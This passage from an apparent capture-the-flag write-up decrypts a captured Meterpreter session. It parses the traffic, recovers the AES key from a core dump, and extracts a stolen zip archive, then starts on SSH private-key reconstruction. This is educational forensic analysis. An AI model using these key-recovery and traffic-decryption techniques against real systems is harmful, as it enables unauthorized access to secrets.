stream = b"".join([bytes(packet[TCP].payload) for packet in pcap if TCP in packet])

```

Now I’ll start at 0 and work through the stream. I’m going to need a function to XOR quickly, so I’ll write that, as well as a dictionary to track the encryption types:

```

enc_types = {0: "None", 1: "AES256", 2: "AES128"}

def xor(buf, key):
    return bytes([x ^ key[i % len(key)] for i, x in enumerate(buf)])

```

Now I loop, taking the first 32 bytes as the header, and parsing it:

```

i = 0
while i < len(stream):
    xor_head = stream[i:i+32]
    xor_key = xor_head[:4]
    head = xor(xor_head, xor_key)
    session_guid = head[4:20]
    enc_flag = int.from_bytes(head[20:24], "big")
    packet_len = int.from_bytes(head[24:28], "big")
    packet_type = int.from_bytes(head[28:32], "big")

    print(f"Packet: type={packet_type:<4} len={packet_len:<8} enc={enc_types[enc_flag]} sess={uuid.UUID(bytes=session_guid)}")
    i += 24 + packet_len

```

I’ll get the XOR key, and then apply it to the full header. Then I can get the session, the encryption flag, the packet length, and the type. I’ll print these to see if they make sense, and they do:

```

oxdf@hacky$ python -i parse_msf.py 
Packet: type=0    len=363      enc=None sess=00000000-0000-0000-0000-000000000000
Packet: type=1    len=373      enc=None sess=00000000-0000-0000-0000-000000000000
Packet: type=0    len=88       enc=AES256 sess=00000000-0000-0000-0000-000000000000
Packet: type=1    len=168      enc=AES256 sess=00000000-0000-0000-0000-000000000000
Packet: type=0    len=104      enc=AES256 sess=00000000-0000-0000-0000-000000000000
Packet: type=1    len=120      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
Packet: type=0    len=104      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
Packet: type=1    len=648      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
Packet: type=0    len=88       enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
...[snip]...

```

It starts out without a session id and unencrypted, and then turns on the encryption, and then generates the session id. Type 0 looks like data from the attacker to the victim, and type 1 from the victim back to the attacker. That matches up with these constants in the [mettle source](https://github.com/rapid7/mettle/blob/52de3c892701e0101746b46ee8b47b76cde8d2d4/mettle/src/tlv_types.h#L10-L11):

![image-20230202162653716](https://0xdfimages.gitlab.io/img/image-20230202162653716.png)

I’ll add `packet_types = {0: "Req", 1: "Resp"}` to the top of the script, and change the print to show the string name instead of the digit.

#### Parse Unencrypted TLVs

In the previous step, I skipped over all the data inside the the packet. To parse the encrypted packets, I’ll need the AES key. But I can tackle the unencrypted packets now.

After I print the packet info, but before incrementing `i`, I’ll add:

```

...[snip]...
   print(f"Packet: type={packet_types[packet_type]:<4} len={packet_len:<8} enc={enc_types[enc_flag]} sess={uuid.UUID(bytes=session_guid)}")

    tlv_data = xor(stream[i+32:i+packet_len+24], xor_key)
    if enc_flag == 1:
        aes_iv = tlv_data[:16]
        tlv_data = tlv_data[16:]
        # future decrypt here

    j = 0
    # skip encrypted for now
    while j < len(tlv_data) and enc_flag == 0:
        l = int.from_bytes(tlv_data[j:j+4], 'big')
        t = int.from_bytes(tlv_data[j+4:j+8], 'big')
        v = tlv_data[j+8:j+l]
        print(f"TLV l={l:<8} t=0x{t:<6x} v={v if len(v) <= 26 else v[:26]}")
        j += l
    
    i += 24 + packet_len

```

This gets the TLV data, and XORs it. Then, if the packet is encrypted, it pulls the IV and moves forward. Now it walks the data, but breaks out if it’s encrypted. This shows the messages sent by the first two packets:

```

oxdf@hacky$ python parse_msf.py 
Packet: type=Req  len=363      enc=None sess=00000000-0000-0000-0000-000000000000
TLV l=12       t=0x20001  v=b'\x00\x00\x00\x10'
TLV l=41       t=0x10002  v=b'20785548998507895601672178'
TLV l=302      t=0x40226  v=b'0\x82\x01"0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x01\x05\x00\x03\x82\x01\x0f\x000\x82'
Packet: type=Resp len=373      enc=None sess=00000000-0000-0000-0000-000000000000
TLV l=24       t=0x401cd  v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=0x20001  v=b'\x00\x00\x00\x10'
TLV l=41       t=0x10002  v=b'20785548998507895601672178'
TLV l=12       t=0x20004  v=b'\x00\x00\x00\x00'
TLV l=12       t=0x20227  v=b'\x00\x00\x00\x01'
TLV l=264      t=0x40229  v=b'-I\x1d\xc1\xa3YLu\xa9\x99/\x96>\xe9\x1f\x9c\xf9g~\x0fH8\xee\xe1y\xf1'
Packet: type=Req  len=88       enc=AES256 sess=00000000-0000-0000-0000-000000000000
Packet: type=Resp len=168      enc=AES256 sess=00000000-0000-0000-0000-000000000000
...[snip]...

```

I’m having it print the first 26 bytes of data because that may give me insight, and it fit on my screen. I’ll also change that as necessary to see more or less data.

It’s completely unnecessary, but I wanted to see what all the TLV message types were. They are defined in that [same source as above](https://github.com/rapid7/mettle/blob/52de3c892701e0101746b46ee8b47b76cde8d2d4/mettle/src/tlv_types.h#L49-L307) for `tlv_types.h`:

![image-20230203063607550](https://0xdfimages.gitlab.io/img/image-20230203063607550.png)

Each one has some constant (like `TLV_META_TYPE_STRING`) that’s defined above in the high two bytes that’s ORed with a number in the low bytes. I’ll copy all that and bring it into `vim` and move it around to make a Python file out of it:

![image-20230203063729063](https://0xdfimages.gitlab.io/img/image-20230203063729063.png)

Now I can import that and pass the numerical value to `tlv_types` and get back the string. This is neat, as it shows that the first thing the client does is send an RSA public key, and then the server sends back an encrypted symmetric key:

```

Packet: type=Req  len=363      enc=None sess=00000000-0000-0000-0000-000000000000
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=b'\x00\x00\x00\x10'
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'20785548998507895601'
TLV l=302      t=TLV_TYPE_RSA_PUB_KEY       v=b'0\x82\x01"0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x01\x05\x00\x03'
Packet: type=Resp len=373      enc=None sess=00000000-0000-0000-0000-000000000000
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=b'\x00\x00\x00\x10'
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'20785548998507895601'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=12       t=TLV_TYPE_SYM_KEY_TYPE      v=b'\x00\x00\x00\x01'
TLV l=264      t=TLV_TYPE_ENC_SYM_KEY       v=b'-I\x1d\xc1\xa3YLu\xa9\x99/\x96>\xe9\x1f\x9c\xf9g~\x0f'

```

#### Extract AES Key

Without access to that private RSA key, I can’t get the unencrypted AES key out of the PCAP. However, the key will be in memory while the process is running, which means it will be in the `core.auto_update` file.

The key for AES256 will be 32 bytes of randomness. There are a bunch of methods to potentially find this key. One would be to just step through the dump one byte at a time, trying each 32-byte buffer. The core dump is not that large (2.7M), so this is possible. But there are smarter ways.

Another way would be to run `gdb auto_update core.auto_update` to load the core dump into GDB. I could then use some reverse engineering to determine the location in memory of the key, and fetch it through GDB.

The easiest way is to take advantage of how AES turns the key into what’s called a “key schedule” or “round keys”. [This article](https://diyinfosec.medium.com/scanning-memory-for-fek-e17ca3db09c9) explains it nicely (In the “Approach 4” section). Basically, AES will turn that 32 bytes into 15 16-byte Round keys. These will appear random as well. Typically, programs will generate these keys once, and then store them in memory and use them as needed, and typically, right next to the original key in memory, like this:

![image-20230202164321563](https://0xdfimages.gitlab.io/img/image-20230202164321563.png)

Because the algorithm to generate the round keys from the key is public, it’s possible to scan memory, and for each possible key, check if it would generate the 15\*16 = 240 bytes that follow. If there’s a match, it’s certainly an AES key.

One tool that implements this search (along with a *ton* of other stuff) is [bulk\_extractor](https://github.com/simsong/bulk_extractor). I’ll download the latest release, run `./configure; make; sudo make install`, and it’s installed on my machine. I’ll run it on the coredump, giving it a folder to output to:

```

oxdf@hacky$ bulk_extractor core.auto_update -o bulk_extractor/
bulk_extractor version: 2.0.0
Input file: "core.auto_update"
Output directory: "bulk_extractor/"
Disk Size: 2819768
Scanners: aes base64 elf evtx exif facebook find gzip httplogs json kml_carved msxml net ntfsindx ntfslogfile ntfsmft ntfsusn pdf rar sqlite utmp vcard_carved
 windirs winlnk winpe winprefetch zip accts email gps
Threads: 4
...[snip]...    

```

There’s a bunch of output:

```

oxdf@hacky$ ls
aes_keys.txt                email_histogram.txt    gps.txt                 ntfsusn_carved.txt  telephone_histogram.txt   utmp_carved.txt
alerts.txt                  email.txt              httplogs.txt            pii_teamviewer.txt  telephone.txt             vcard.txt
ccn_histogram.txt           ether_histogram_1.txt  ip_histogram.txt        pii.txt             unrar_carved.txt          windirs.txt
ccn_track2_histogram.txt    ether_histogram.txt    ip.txt                  rar.txt             url_facebook-address.txt  winlnk.txt
ccn_track2.txt              ether.txt              jpeg_carved.txt         report.xml          url_facebook-id.txt       winpe_carved.txt
ccn.txt                     evtx_carved.txt        json.txt                rfc822.txt          url_histogram.txt         winpe.txt
domain_histogram.txt        exif.txt               kml_carved.txt          sin.txt             url_microsoft-live.txt    winprefetch.txt
domain.txt                  facebook.txt           ntfsindx_carved.txt     sqlite_carved.txt   url_searches.txt          zip.txt
elf.txt                     find_histogram.txt     ntfslogfile_carved.txt  tcp_histogram.txt   url_services.txt
email_domain_histogram.txt  find.txt               ntfsmft_carved.txt      tcp.txt             url.txt

```

Only four of them are bigger than 0:

```

oxdf@hacky$ find . -size +1b -ls
 713   4 drwxrwx---   1 root     vboxsf       4096 Feb  2 20:16 .
 716   4 -rwxrwx---   1 root     vboxsf        601 Feb  2 18:41 ./aes_keys.txt
 754  12 -rwxrwx---   1 root     vboxsf      10207 Feb  2 18:41 ./report.xml
 751   4 -rwxrwx---   1 root     vboxsf       1926 Feb  2 18:41 ./domain.txt
 717  20 -rwxrwx---   1 root     vboxsf      16678 Feb  2 18:41 ./elf.txt

```

`aes_keys.txt` shows four, but all the same:

```

# BANNER FILE NOT PROVIDED (-b option)
# BULK_EXTRACTOR-Version: 2.0.0
# Feature-Recorder: aes_keys
# Filename: core.auto_update
# Feature-File-Version: 1.1
1687472 f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5 AES256
2510080 f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5 AES256
2796144 f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5 AES256
2801600 f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5 AES256

```

#### Parse Encrypted TLVs

I’ll add that key to the top of my Python script:

```

aes_key = bytes.fromhex('f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5')

```

Now I’ll just decrypt the TLV data before parsing it:

```

    tlv_data = xor(stream[i+32:i+packet_len+24], xor_key)
    if enc_flag == 1:
        aes_iv = tlv_data[:16]
        cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
        tlv_data = cipher.decrypt(tlv_data[16:])

```

I found some weird edge cases where there was extra data (nulls or AES padding?) at the end of the TLV data. To account for this, I’ll add some extra checks at the top:

```

    while j < len(tlv_data):
        l = int.from_bytes(tlv_data[j:j+4], 'big')
        if j + l > len(tlv_data) or l == 0:
            break

```

It works:

```

Packet: type=Req  len=363      enc=None sess=00000000-0000-0000-0000-000000000000
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_NEGOTIATE_TLV_ENCRYPT
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'20785548998507895601672178'
TLV l=302      t=TLV_TYPE_RSA_PUB_KEY       v=b'0\x82\x01"0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x01\x05\x00\x03\x82\x01\x0f\x000\x82'
Packet: type=Resp len=373      enc=None sess=00000000-0000-0000-0000-000000000000
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_NEGOTIATE_TLV_ENCRYPT
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'20785548998507895601672178'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=12       t=TLV_TYPE_SYM_KEY_TYPE      v=b'\x00\x00\x00\x01'
TLV l=264      t=TLV_TYPE_ENC_SYM_KEY       v=b'-I\x1d\xc1\xa3YLu\xa9\x99/\x96>\xe9\x1f\x9c\xf9g~\x0fH8\xee\xe1y\xf1'
Packet: type=Req  len=88       enc=AES256 sess=00000000-0000-0000-0000-000000000000
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_MACHINE_ID
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'02317692758618192060783778'
Packet: type=Resp len=168      enc=AES256 sess=00000000-0000-0000-0000-000000000000
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_MACHINE_ID
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'02317692758618192060783778'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=54       t=TLV_TYPE_MACHINE_ID        v=b'10.10.13.37:b88b42ad757245'
...[snip]...

```

The last line there from an encrypted packet shows the type of `MACHINE_ID` and the value of the IP address.

#### Meterpreter Session Analysis

The full output of the parsed pcap is available [here](https://gitlab.com/0xdf/ctfscripts/-/blob/master/htb-response/msf_output.txt). I’ll cover some highlights.

Each request packet seems to have a `COMMAND_ID` and a `REQUEST_ID`. The `COMMAND_ID` defines the type of command (it can be looked up [here](https://github.com/rapid7/mettle/blob/52de3c892701e0101746b46ee8b47b76cde8d2d4/mettle/src/command_ids.h)). The `REQUEST_ID` seems to be unique for the request. For example:

```

Packet: type=Req  len=88       enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=b'\x00\x00\x04\x1f'
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'507543306427'

```

0x41f = 1055 = ` COMMAND\_ID\_STDAPI\_SYS\_CONFIG\_GETUID`:=. The response sends back the` COMMAND\_ID `and` REQUEST\_ID `(sometimes with some extra data?) along with a` UUID` and the result:

```

Packet: type=Resp len=184      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=b'\x00\x00\x04\x1f'
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'50754330642773297958'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=55       t=TLV_TYPE_USER_NAME         v=b'root @ response (uid'

```

I’ll add a bit more code to parse these command ids, adding them to my constants and then calling it like this:

```

    j = 0
    while j + 8 < len(tlv_data):
        l = int.from_bytes(tlv_data[j:j+4], 'big')
        if l == 0:
            import pdb;pdb.set_trace()
        t = int.from_bytes(tlv_data[j+4:j+8], 'big')
        v = tlv_data[j+8:j+l]
        if t == 0x20001: #COMMAND_ID
            v = cmd_ids[int.from_bytes(v[:4], 'big')]
        print(f"TLV l={l:<8} t={tlv_types[t]:<26} v={v if len(v) <= 20 else v[:20]}")
        j += l

```

Now that `REQUEST_ID` looks like:

```

Packet: type=Req  len=88       enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=STDAPI_SYS_CONFIG_GETUID
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'50754330642773297958262819401791\x00'
Packet: type=Resp len=184      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=STDAPI_SYS_CONFIG_GETUID
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'50754330642773297958262819401791\x00'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=55       t=TLV_TYPE_USER_NAME         v=b'root @ response (uid=0, gid=0, euid=0, egid=0)\x00'

```

Another interesting command is `FL_LS`:

```

Packet: type=Resp len=360      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=STDAPI_FS_LS
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'20050676170239424614686344865879\x00'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=20       t=TLV_TYPE_FILE_NAME         v=b'auto_update\x00'
TLV l=29       t=TLV_TYPE_FILE_PATH         v=b'/dev/shm/auto_update\x00'
TLV l=72       t=TLV_TYPE_STAT_BUF          v=b"\x1a\x00\x00\x00\xed\x81\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x98\xc0\x0f\x00\x00\x00\x00\x00o'/b\x00\x00\x00\x00\x8a\x1e/b\x00\x00\x00\x00m'/b\x00\x00\x00\x00"
TLV l=18       t=TLV_TYPE_FILE_NAME         v=b'multipath\x00'
TLV l=27       t=TLV_TYPE_FILE_PATH         v=b'/dev/shm/multipath\x00'
TLV l=72       t=TLV_TYPE_STAT_BUF          v=b'\x1a\x00\x00\x00\xc0A\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00P\x00\x00\x00\x00\x00\x00\x00\xc3'

```

It seems for each file, it returns `FILE_NAME`, `FILE_PATH`, and `STAT_BUF`. I’m not sure how to interpret the `STAT_BUF`.

I can see the commands executed in the session and their results:

| Command | Response |
| --- | --- |
| CORE\_NEGOTIATE\_TLV\_ENCRYPTION (includes RSA public key) | Sends encrypted symmetric key |
| CORE\_MACHINE\_ID | `10.10.13.37:b88b42ad757245828e688fdbfa4824f8` |
| CORE\_SET\_SESSION\_GUID | - |
| CORE\_ENUMEXTCMD | Returns a long list of UINTs |
| STDAPI\_FS\_GETWD | `/dev/shm` |
| STDAPI\_SYS\_CONFIG\_GETUID | `root @ response root @ response (uid=0, gid=0, euid=0, egid=0)` |
| STDAPI\_SYS\_CONFIG\_SYSINFO | Three TLVS: - `COMPUTER_NAME` = `10.10.13.37` - `OS_NAME` = `Ubuntu 20.04 (Linux 5.4.0-100-generic)` - `ARCHITECTURE` = `x86_64` - `BUILD_TUPLE` = `x86_64-linux-musl` |
| STDAPI\_NET\_CONFIG\_GET\_INTERFACES | Full list of interfaces |
| STDAPI\_NET\_CONFIG\_GET\_ROUTES | Full list of routes |
| STDAPI\_FS\_GETWD | `/dev/shm` |
| STDAPI\_FS\_STAT, `FILE_PATH` = `/dev/shm` | A `STAT_BUF`. Not sure how to interpret. |
| STDAPI\_FS\_LS, `DIRECTORY_PATH` = `/dev/shm` | Two files, `auto_update` and `multipath`. |
| STDAPI\_FS\_GETWD | `/dev/shm` |
| STDAPI\_FS\_STAT, `FILE_PATH` = `/root` | A `STAT_BUF`. Not sure how to interpret. |
| STDAPI\_FS\_LS, `DIRECTORY_PATH` = `/root` | Files in `/root`. |
| STDAPI\_FS\_STAT, `FILE_PATH` = `/root/docs_backup.zip` | A `STAT_BUF`. Not sure how to interpret. |
| CORE\_CHANNEL\_OPEN, `FILE_PATH` = `/root/docs_backup.zip` | Returns a channel id. |
| STDAPI\_FS\_STAT, `FILE_PATH` = `/root/docs_backup.zip` | A `STAT_BUF`. Not sure how to interpret. |
| CORE\_CHANNEL\_READ, `CHANNEL_ID` = 1 | 1,048,576 bytes, starting with PK |
| CORE\_CHANNEL\_READ, `CHANNEL_ID` = 1 | 225,962 bytes |
| CORE\_CHANNEL\_READ, `CHANNEL_ID` = 1 | No data |
| CORE\_CHANNEL\_EOF, `CHANNEL_ID` = 1 | - |
| CORE\_CHANNEL\_CLOSE, `CHANNEL_ID` = 1 | - |

#### Extract Zip

I’ll notice that the big file transfers happen in the upload of `/root/docs_backup.zip`. The hints in the report already mentioned needing to get into a zip archive. I’ll add some code the save that. There are three `CHANNEL_READ` requests:

```

Packet: type=Req  len=104      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'81583094782444646844363494472485\x00'
TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b'\x00\x00\x00\x01'
TLV l=12       t=TLV_TYPE_LENGTH            v=b'\x00\x10\x00\x00'
Packet: type=Resp len=1048712  enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ
TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b'\x00\x00\x00\x01'
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'81583094782444646844363494472485\x00'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=1048584  t=TLV_TYPE_CHANNEL_DATA      v=b'PK\x03\x04\n\x00\x00\x00\x00\x00\xb4TnT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x1c\x00Documents/UT\t\x00\x03\xe3\x0c/b\\\x9bJcux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00PK\x03\x04\x14\x00\x00\x00\x08\x00\xabTnT\x1cV\x87\xf8\x85\x00\x00\x00\xf5\x00\x00\x00\x14\x00\x1c\x00Documents/.tmux.confUT\t\x00\x03\xd1\x0c/ba\r/bux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00\x8d\x8e\xc1\n\xc3 \x10D\xef~\xc5b)9\t\xbd\xf4{\x82\xda\xad.5\xab\xe8\xa6!\x94\xfe{\x95\xder(\x9d\xd30\xf3\x06\xa6\xa1\x80\t\x10\xa9I\xae\xbbI\xb4\x90\xc0\xf5\xd2'
Packet: type=Req  len=104      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'48857921355208983185187224372436\x00'
TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b'\x00\x00\x00\x01'
TLV l=12       t=TLV_TYPE_LENGTH            v=b'\x00\x10\x00\x00'
Packet: type=Resp len=226104   enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ
TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b'\x00\x00\x00\x01'
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'48857921355208983185187224372436\x00'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=225970   t=TLV_TYPE_CHANNEL_DATA      v=b'\xfa\x8a"\x15\xb3[BS\x04~\x15VV\x80\xbc!\xb7)Q<\xce\xe5\xc0y1\x19U\xbe\x94\xd4\x1e\xd6\xd0D\x12\xb5S\xe3\xa6"a@\xfaXO\x9a\xb2V\xf4\xceb\xbd\xde\xbf\xda\\.\x81\xd1\xd6\nzc|E\x16c\xc7X`*\xf8\x88\x11e;\xdb1T\xfe\xc8\xd1_\xbf,\xb1!!A\x9eg\xba\xde\xa5\x99$\xf9\x81{\xbc\x14b\xe2\x9a;\x16\xb0\xee^%\xf6`]\x85\x00x:a\x0c\xbe\xe3\x97i\x97\xcdJ{\xf5]w2G\xe0D\xe5P\x8a\xd8d\xe2j\'\x13\xfe\xa1\xae\x1c\xc6zF\x0c\x94L\xcc\xd7\xdd\x9dj\xa1\xe7\xaa\x83t\xd4\xc1\xa7W\x1b\xac\x1e\x8f\xa0\x19\x0f^T\xfa \xf3e\xf0\xddg\x05GWnj\xa2\xfb \xf0\xd0\xd8\xe3(\xab\xb8\xb6C'
Packet: type=Req  len=104      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'71560517686021057956178610979680\x00'
TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b'\x00\x00\x00\x01'
TLV l=12       t=TLV_TYPE_LENGTH            v=b'\x00\x10\x00\x00'
Packet: type=Resp len=136      enc=AES256 sess=6b2f41af-eb74-454f-9606-77b703dab297
TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ
TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b'\x00\x00\x00\x01'
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'71560517686021057956178610979680\x00'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=8        t=TLV_TYPE_CHANNEL_DATA      v=b''

```

If it’s `TLV_TYPE_CHANNEL_DATA`, I want to save that to a file. If there were many files, I’d want to parse the file name from the channel open request, and then save based channel id. Given there’s only one, I’ll just create that file and save to it if the TLV type is `CHANNEL_DATA`. At the top of my script, I’ll clear any existing data in that file (otherwise running twice in a row would give a double zip):

```

open('docs_backup.zip', 'w').close() # clear zip file

```

Now in the loop parsing TLVs, I’ll add a check for `CHANNEL_DATA`:

```

    while j < len(tlv_data):
        l = int.from_bytes(tlv_data[j:j+4], 'big')
        if j + l > len(tlv_data) or l == 0:
            break
        t = int.from_bytes(tlv_data[j+4:j+8], 'big')
        v = tlv_data[j+8:j+l]
        if t == 0x20001: #COMMAND_ID
            v = cmd_ids[int.from_bytes(v[:4], 'big')]
        elif t == 0x40034: #CHANNEL_DATA
            with open('docs_backup.zip', 'ab') as f:
                f.write(v)
        if len(v) > 200:
            v = v[:200]
        print(f"TLV l={l:<8} t={tlv_types[t]:<26} v={v}")
        j += l

```

Running the script gives the zip:

```

oxdf@hacky$ file docs_backup.zip 
docs_backup.zip: Zip archive data, at least v1.0 to extract

```

The final script is available [here](https://gitlab.com/0xdf/ctfscripts/-/blob/master/htb-response/parse_msf.py).

### SSH

#### Enumerate docs\_backup.zip

The zip file has a backup of a `Documents` folder:

```

oxdf@hacky$ zipinfo docs_backup.zip 
Archive:  docs_backup.zip
Zip file size: 1274538 bytes, number of entries: 6
drwxr-xr-x  3.0 unx        0 bx stor 22-Mar-14 09:37 Documents/
-rw-rw-r--  3.0 unx      245 tx defN 22-Mar-14 09:37 Documents/.tmux.conf
-rw-rw-r--  3.0 unx  1278243 bx defN 22-Jun-15 11:37 Documents/Screenshot from 2022-06-15 13-37-42.png
-rw-rw-r--  3.0 unx       95 tx defN 22-Mar-14 09:37 Documents/.vimrc
-rw-------  3.0 unx     1522 tx defN 22-Mar-14 08:57 Documents/bookmarks_3_14_22.html
-rw-------  3.0 unx      567 tx defN 22-Mar-14 09:36 Documents/authorized_keys
6 files, 1280672 bytes uncompressed, 1273444 bytes compressed:  0.6%

```

The `authorized_keys` file only has the public key for the root user on Response. Not much use on its own. The `bookmarks_3_14_22.html` file has a couple links to a twitter page and another hacking site. Nothing interesting in the `.tmux.conf` or `.vimrc` file.

The screenshot is interesting:

![image-20230203111834631](https://0xdfimages.gitlab.io/img/image-20230203111834631.png)

It’s the Ubuntu desktop of a user with the Response site up, file manager, some updates, as well as a terminal. What’s interesting is that the terminal has the end of a private SSH key:

![image-20230203111946035](https://0xdfimages.gitlab.io/img/image-20230203111946035.png)

#### RSA Background

In general, there are a handful of variables associated with RSA.
- You start with random primes `p` and `q`.
- `n = p * q`, and `φ = (p-1) * (q-1)`.
- `e` is some number greater than 1 but less than `φ`. It’s almost always set to 0x10001 (65537).
- `d` is the modular multiplicative inverse of `e mod φ`. That sounds complex, but it’s one line of Python.

To encrypt a message, `m`, you convert it to an int and the encrypted int is `m^e mod n`. To decrypt, take `c^d mod n`. That’s it.

SSH public key formats are discussed in [RFC4253 section 6.6](https://www.rfc-editor.org/rfc/rfc4253#section-6.6). Typically a public key has three fields:
- key type
- base64-encoded blob of values
- comment (typically the email address of the user)

The `ssh-rsa` format for the blob of values is defined:

> ```

> The "ssh-rsa" key format has the following specific encoding:
>
>   string    "ssh-rsa"
>   mpint     e
>   mpint     n
>
> ```

Each item in the key is of the form `[4 byte length][value]`. The private key structure isn’t in that RFC, but it is described in [this blog post](https://dnaeon.github.io/openssh-private-key-binary-format/) as:

> ```

> ;; AUTH_MAGIC is a hard-coded, null-terminated string,
> ;; set to "openssh-key-v1".
> byte[n] AUTH_MAGIC
>
> ;; ciphername determines the cipher name (if any),
> ;; or is set to "none", when no encryption is used.
> string   ciphername
>
> ;; kdfname determines the KDF function name, which is
